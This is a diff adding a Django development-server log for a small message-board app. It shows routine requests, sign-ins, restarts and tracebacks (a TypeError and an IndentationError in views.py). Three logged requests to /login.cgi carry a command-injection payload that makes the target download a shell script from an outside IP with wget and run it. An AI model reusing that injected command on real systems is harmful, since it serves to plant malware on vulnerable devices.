@@ -1,0 +1,300 @@
+[04/Sep/2018 17:57:46] "GET / HTTP/1.1" 200 1169
+[04/Sep/2018 17:57:46] "GET /static/css/board.css?ver=1 HTTP/1.1" 304 0
+[04/Sep/2018 17:57:47] "GET / HTTP/1.1" 200 1169
+[04/Sep/2018 17:57:47] "GET /board/ HTTP/1.1" 200 1369
+Not Found: /poll
+[04/Sep/2018 17:57:48] "GET /poll HTTP/1.1" 404 3446
+[04/Sep/2018 17:58:22] "GET /board/ HTTP/1.1" 200 1330
+[04/Sep/2018 17:58:27] "GET /board/ HTTP/1.1" 200 1330
+Internal Server Error: /board/1/
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/usr/local/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/usr/local/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/python/mysite/board/views.py", line 21, in board_detail
+    user = User.objects.get(id=int(request.user.id))
+TypeError: int() argument must be a string, a bytes-like object or a number, not 'NoneType'
+[04/Sep/2018 17:58:28] "GET /board/1/ HTTP/1.1" 500 62852
+Performing system checks...
+
+System check identified no issues (0 silenced).
+September 04, 2018 - 17:57:32
+Django version 2.1, using settings 'mysite.settings'
+Starting development server at http://0:80/
+Quit the server with CONTROL-C.
+[04/Sep/2018 18:01:00] "GET /board/1/ HTTP/1.1" 200 1959
+[04/Sep/2018 18:01:00] "GET /static/css/board.css?ver=1 HTTP/1.1" 304 0
+[04/Sep/2018 18:01:03] "GET /board/ HTTP/1.1" 200 1330
+Performing system checks...
+
+System check identified no issues (0 silenced).
+September 04, 2018 - 18:00:58
+Django version 2.1, using settings 'mysite.settings'
+Starting development server at http://0:80/
+Quit the server with CONTROL-C.
+[04/Sep/2018 18:03:24] "GET /board/1/ HTTP/1.1" 200 1603
+[04/Sep/2018 18:03:24] "GET /static/css/board.css?ver=1 HTTP/1.1" 304 0
+[04/Sep/2018 18:03:27] "GET / HTTP/1.1" 200 1130
+[04/Sep/2018 18:03:28] "GET /board/1/ HTTP/1.1" 200 1603
+[04/Sep/2018 18:03:45] "GET / HTTP/1.1" 200 1130
+[04/Sep/2018 18:03:46] "GET /board/ HTTP/1.1" 200 1330
+[04/Sep/2018 18:03:47] "GET / HTTP/1.1" 200 1130
+[04/Sep/2018 18:03:47] "GET /board/ HTTP/1.1" 200 1330
+[04/Sep/2018 18:03:48] "GET / HTTP/1.1" 200 1130
+[04/Sep/2018 18:03:48] "GET /board/ HTTP/1.1" 200 1330
+[04/Sep/2018 18:03:49] "GET / HTTP/1.1" 200 1130
+[04/Sep/2018 18:03:49] "GET /board/ HTTP/1.1" 200 1330
+[04/Sep/2018 18:03:50] "GET /board/1/ HTTP/1.1" 200 1603
+[04/Sep/2018 18:03:51] "GET / HTTP/1.1" 200 1130
+[04/Sep/2018 18:03:51] "GET / HTTP/1.1" 200 1130
+Performing system checks...
+
+System check identified no issues (0 silenced).
+September 04, 2018 - 18:03:06
+Django version 2.1, using settings 'mysite.settings'
+Starting development server at http://0:80/
+Quit the server with CONTROL-C.
+[04/Sep/2018 19:28:33] "GET / HTTP/1.1" 200 1130
+[04/Sep/2018 20:49:35] "GET / HTTP/1.1" 200 1130
+[04/Sep/2018 21:30:19] "GET / HTTP/1.1" 200 1130
+[04/Sep/2018 21:58:52] "GET / HTTP/1.1" 200 1130
+[04/Sep/2018 22:12:09] "GET / HTTP/1.1" 200 1130
+[04/Sep/2018 22:21:44] "GET / HTTP/1.1" 200 1130
+[04/Sep/2018 22:34:01] "GET / HTTP/1.1" 200 1130
+[04/Sep/2018 22:37:32] "GET / HTTP/1.1" 200 1130
+[04/Sep/2018 22:39:29] "GET / HTTP/1.1" 200 1130
+Not Found: /login.cgi
+[04/Sep/2018 22:42:03] "GET /login.cgi?cli=aa%20aa%27;wget%20http://77.87.77.250/izuku.sh%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1" 404 3559
+[04/Sep/2018 23:07:18] "GET / HTTP/1.1" 200 1130
+[04/Sep/2018 23:38:13] "GET / HTTP/1.1" 200 1130
+[04/Sep/2018 23:57:46] "GET / HTTP/1.1" 200 1130
+[05/Sep/2018 00:28:18] "GET / HTTP/1.1" 200 1130
+[05/Sep/2018 00:53:16] "GET / HTTP/1.1" 200 1130
+Not Found: /login.cgi
+[05/Sep/2018 01:10:48] "GET /login.cgi?cli=aa%20aa%27;wget%20http://77.87.77.250/izuku.sh%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1" 404 3559
+Not Found: /login.cgi
+[05/Sep/2018 01:19:34] "GET /login.cgi?cli=aa%20aa%27;wget%20http://77.87.77.250/izuku.sh%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1" 404 3559
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[05/Sep/2018 01:46:46] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1738
+[05/Sep/2018 03:22:40] "GET / HTTP/1.1" 200 1130
+[05/Sep/2018 03:46:11] "GET /board/1/ HTTP/1.1" 200 1603
+[05/Sep/2018 03:46:11] "GET /static/css/board.css?ver=1 HTTP/1.1" 304 0
+[05/Sep/2018 03:46:16] "GET /signin/ HTTP/1.1" 200 1643
+[05/Sep/2018 03:46:23] "POST /signin/ HTTP/1.1" 302 0
+[05/Sep/2018 03:46:23] "GET / HTTP/1.1" 200 1225
+[05/Sep/2018 03:46:58] "GET /board/1/ HTTP/1.1" 200 2164
+[05/Sep/2018 03:47:00] "GET /signout/ HTTP/1.1" 302 0
+[05/Sep/2018 03:47:01] "GET / HTTP/1.1" 200 1130
+[05/Sep/2018 03:47:02] "GET /board/1/ HTTP/1.1" 200 1603
+[05/Sep/2018 03:47:04] "GET /signin/ HTTP/1.1" 200 1643
+[05/Sep/2018 03:47:08] "POST /signin/ HTTP/1.1" 200 5
+[05/Sep/2018 03:47:09] "GET /signin/ HTTP/1.1" 200 1643
+[05/Sep/2018 03:47:13] "POST /signin/ HTTP/1.1" 302 0
+[05/Sep/2018 03:47:13] "GET / HTTP/1.1" 200 1225
+[05/Sep/2018 03:47:15] "GET /board/1/ HTTP/1.1" 200 2164
+Performing system checks...
+
+System check identified no issues (0 silenced).
+September 04, 2018 - 18:05:59
+Django version 2.1, using settings 'mysite.settings'
+Starting development server at http://0:80/
+Quit the server with CONTROL-C.
+True
+True
+Unhandled exception in thread started by <function check_errors.<locals>.wrapper at 0x7f85b84f06a8>
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.7/site-packages/django/utils/autoreload.py", line 225, in wrapper
+    fn(*args, **kwargs)
+  File "/usr/local/lib/python3.7/site-packages/django/core/management/commands/runserver.py", line 117, in inner_run
+    self.check(display_num_errors=True)
+  File "/usr/local/lib/python3.7/site-packages/django/core/management/base.py", line 379, in check
+    include_deployment_checks=include_deployment_checks,
+  File "/usr/local/lib/python3.7/site-packages/django/core/management/base.py", line 366, in _run_checks
+    return checks.run_checks(**kwargs)
+  File "/usr/local/lib/python3.7/site-packages/django/core/checks/registry.py", line 71, in run_checks
+    new_errors = check(app_configs=app_configs)
+  File "/usr/local/lib/python3.7/site-packages/django/core/checks/urls.py", line 40, in check_url_namespaces_unique
+    all_namespaces = _load_all_namespaces(resolver)
+  File "/usr/local/lib/python3.7/site-packages/django/core/checks/urls.py", line 57, in _load_all_namespaces
+    url_patterns = getattr(resolver, 'url_patterns', [])
+  File "/usr/local/lib/python3.7/site-packages/django/utils/functional.py", line 37, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib/python3.7/site-packages/django/urls/resolvers.py", line 533, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib/python3.7/site-packages/django/utils/functional.py", line 37, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib/python3.7/site-packages/django/urls/resolvers.py", line 526, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/local/lib/python3.7/importlib/__init__.py", line 127, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 1006, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 983, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 967, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 677, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 728, in exec_module
+  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+  File "/python/mysite/mysite/urls.py", line 24, in <module>
+    path('', include('board.urls')),
+  File "/usr/local/lib/python3.7/site-packages/django/urls/conf.py", line 34, in include
+    urlconf_module = import_module(urlconf_module)
+  File "/usr/local/lib/python3.7/importlib/__init__.py", line 127, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 1006, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 983, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 967, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 677, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 728, in exec_module
+  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+  File "/python/mysite/board/urls.py", line 3, in <module>
+    from . import views
+  File "/python/mysite/board/views.py", line 84
+    def signup(request):
+      ^
+IndentationError: expected an indented block
+Performing system checks...
+
+Unhandled exception in thread started by <function check_errors.<locals>.wrapper at 0x7fce171506a8>
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.7/site-packages/django/utils/autoreload.py", line 225, in wrapper
+    fn(*args, **kwargs)
+  File "/usr/local/lib/python3.7/site-packages/django/core/management/commands/runserver.py", line 117, in inner_run
+    self.check(display_num_errors=True)
+  File "/usr/local/lib/python3.7/site-packages/django/core/management/base.py", line 379, in check
+    include_deployment_checks=include_deployment_checks,
+  File "/usr/local/lib/python3.7/site-packages/django/core/management/base.py", line 366, in _run_checks
+    return checks.run_checks(**kwargs)
+  File "/usr/local/lib/python3.7/site-packages/django/core/checks/registry.py", line 71, in run_checks
+    new_errors = check(app_configs=app_configs)
+  File "/usr/local/lib/python3.7/site-packages/django/core/checks/urls.py", line 40, in check_url_namespaces_unique
+    all_namespaces = _load_all_namespaces(resolver)
+  File "/usr/local/lib/python3.7/site-packages/django/core/checks/urls.py", line 57, in _load_all_namespaces
+    url_patterns = getattr(resolver, 'url_patterns', [])
+  File "/usr/local/lib/python3.7/site-packages/django/utils/functional.py", line 37, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib/python3.7/site-packages/django/urls/resolvers.py", line 533, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib/python3.7/site-packages/django/utils/functional.py", line 37, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib/python3.7/site-packages/django/urls/resolvers.py", line 526, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/local/lib/python3.7/importlib/__init__.py", line 127, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 1006, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 983, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 967, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 677, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 728, in exec_module
+  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+  File "/python/mysite/mysite/urls.py", line 24, in <module>
+    path('', include('board.urls')),
+  File "/usr/local/lib/python3.7/site-packages/django/urls/conf.py", line 34, in include
+    urlconf_module = import_module(urlconf_module)
+  File "/usr/local/lib/python3.7/importlib/__init__.py", line 127, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 1006, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 983, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 967, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 677, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 728, in exec_module
+  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+  File "/python/mysite/board/urls.py", line 3, in <module>
+    from . import views
+  File "/python/mysite/board/views.py", line 84
+    def signup(request):
+      ^
+IndentationError: expected an indented block
+Performing system checks...
+
+[05/Sep/2018 05:07:34] "GET / HTTP/1.1" 200 1131
+[05/Sep/2018 05:07:34] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 05:07:39] "GET / HTTP/1.1" 200 1131
+[05/Sep/2018 05:07:39] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 05:07:40] "GET /board/ HTTP/1.1" 200 1328
+[05/Sep/2018 05:07:40] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 05:07:41] "GET / HTTP/1.1" 200 1131
+[05/Sep/2018 05:07:41] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 05:07:41] "GET / HTTP/1.1" 200 1131
+[05/Sep/2018 05:07:41] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 05:07:43] "GET /board/ HTTP/1.1" 200 1328
+[05/Sep/2018 05:07:43] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 05:07:45] "GET /signin/ HTTP/1.1" 200 1643
+[05/Sep/2018 05:07:45] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 05:07:52] "POST /signin/ HTTP/1.1" 302 0
+[05/Sep/2018 05:07:52] "GET / HTTP/1.1" 200 1226
+[05/Sep/2018 05:07:52] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 05:07:54] "GET /board/ HTTP/1.1" 200 1518
+[05/Sep/2018 05:07:54] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 05:07:55] "GET /board/new/ HTTP/1.1" 200 1631
+[05/Sep/2018 05:07:55] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 05:08:05] "POST /board/new/ HTTP/1.1" 200 1646
+[05/Sep/2018 05:08:05] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 05:08:07] "GET / HTTP/1.1" 200 1470
+[05/Sep/2018 05:08:07] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 05:08:08] "GET /board/ HTTP/1.1" 200 1646
+[05/Sep/2018 05:08:08] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 05:08:09] "GET / HTTP/1.1" 200 1470
+[05/Sep/2018 05:08:09] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 05:08:10] "GET /board/ HTTP/1.1" 200 1646
+[05/Sep/2018 05:08:10] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 05:08:13] "GET / HTTP/1.1" 200 1375
+[05/Sep/2018 05:08:51] "GET /board/new/ HTTP/1.1" 200 1631
+[05/Sep/2018 05:08:51] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 05:09:02] "POST /board/new/ HTTP/1.1" 200 1776
+[05/Sep/2018 05:09:02] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 05:09:03] "GET / HTTP/1.1" 200 3344
+[05/Sep/2018 05:09:03] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 05:09:34] "GET / HTTP/1.1" 200 3249
+[05/Sep/2018 05:09:34] "GET /static/css/bootstrap/3.3.2/css/bootstrap-theme.min.css HTTP/1.1" 200 19963
+[05/Sep/2018 05:09:34] "GET /static/css/board.css?ver=2 HTTP/1.1" 200 773
+[05/Sep/2018 05:09:34] "GET /static/css/bootstrap/3.3.2/css/bootstrap.min.css HTTP/1.1" 200 117150
+[05/Sep/2018 05:09:34] "GET /static/js/bootstrap/3.3.2/bootstrap.min.js HTTP/1.1" 200 35452
+[05/Sep/2018 05:09:34] "GET /static/css/bootstrap/3.3.2/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 18028
+[05/Sep/2018 05:09:39] "GET /board HTTP/1.1" 301 0
+[05/Sep/2018 05:09:39] "GET /board/ HTTP/1.1" 200 1586
+[05/Sep/2018 05:09:39] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 05:09:44] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 05:09:44] "GET / HTTP/1.1" 200 3249
+[05/Sep/2018 05:09:44] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 05:09:45] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 05:09:45] "GET / HTTP/1.1" 200 3249
+[05/Sep/2018 05:09:45] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 05:09:46] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 05:09:46] "GET / HTTP/1.1" 200 3249
+[05/Sep/2018 05:09:46] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 05:15:42] "GET /board/6/ HTTP/1.1" 200 3059
+[05/Sep/2018 05:15:42] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 05:31:46] "GET / HTTP/1.1" 200 3249
+[05/Sep/2018 05:48:13] "GET / HTTP/1.1" 200 3249
+[05/Sep/2018 05:48:13] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 05:48:14] "GET /board/ HTTP/1.1" 200 1586
+[05/Sep/2018 05:48:15] "GET / HTTP/1.1" 200 3249
+[05/Sep/2018 05:48:15] "GET /board/ HTTP/1.1" 200 1586
+[05/Sep/2018 05:48:18] "GET /signin/ HTTP/1.1" 200 1643
+[05/Sep/2018 05:48:24] "POST /signin/ HTTP/1.1" 302 0
+[05/Sep/2018 05:48:24] "GET / HTTP/1.1" 200 3344
+[05/Sep/2018 05:48:25] "GET /signin/ HTTP/1.1" 200 1738
+[05/Sep/2018 05:48:28] "GET /signin/ HTTP/1.1" 200 1738
+Performing system checks...
+
+System check identified no issues (0 silenced).
+September 05, 2018 - 05:07:30
+Django version 2.1, using settings 'mysite.settings'
+Starting development server at http://0:80/
+Quit the server with CONTROL-C.
+True
+unini
+unini
+True
+[05/Sep/2018 05:49:29] "GET / HTTP/1.1" 200 3255
+[05/Sep/2018 05:49:30] "GET / HTTP/1.1" 200 3255
+[05/Sep/2018 05:49:31] "GET / HTTP/1.1" 200 3255
+[05/Sep/2018 05:49:32] "GET /signout/ HTTP/1.1" 302 0
+[05/Sep/2018 05:49:32] "GET / HTTP/1.1" 200 3252
+[05/Sep/2018 05:49:33] "GET /signin/ HTTP/1.1" 200 1646
+[05/Sep/2018 05:49:38] "POST /signin/ HTTP/1.1" 200 5
+[05/Sep/2018 05:49:40] "GET /signin/ HTTP/1.1" 200 1646
+[05/Sep/2018 05:49:42] "POST /signin/ HTTP/1.1" 302 0
+[05/Sep/2018 05:49:42] "GET / HTTP/1.1" 200 3255
